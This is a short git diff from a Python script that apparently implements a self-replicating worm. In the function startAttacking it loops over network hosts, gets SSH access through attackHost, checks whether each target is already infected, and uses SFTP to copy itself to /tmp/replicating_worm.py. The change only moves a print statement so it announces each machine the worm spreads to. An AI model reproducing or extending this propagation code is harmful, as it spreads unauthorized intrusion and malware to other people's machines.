@@ -128,11 +128,11 @@ def startAttacking(wormLocation, isHost):
 	for Host in network:
 		
 		sshInfo = attackHost(Host)
-
-		if isHost:
-			print("SSH Info: %s" %(str(sshInfo)))
 		
 		if sshInfo and isTargetInfected(sshInfo[0]) == False:
+
+			if isHost:
+				print("Spreading to this machine: %s" %(str(Host)))
 			
 			sftpClient = sshInfo[0].open_sftp()
 			sftpClient.put(wormLocation, "/tmp/" + "replicating_worm.py")
